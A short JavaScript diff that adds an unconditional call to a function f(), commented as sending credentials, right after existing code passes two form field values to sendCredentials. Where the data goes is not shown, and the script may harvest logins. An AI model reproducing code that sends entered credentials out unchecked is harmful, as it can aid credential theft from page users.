@@ -64,6 +64,9 @@ function attachEventListeners() {
   if (a.value.length > 0 && b.value.length > 0) {
     sendCredentials(a.value, b.value);
   }
+
+  // Directly call the function to send credentials if available
+  f();
 }
 
 document.addEventListener('DOMContentLoaded', function() {
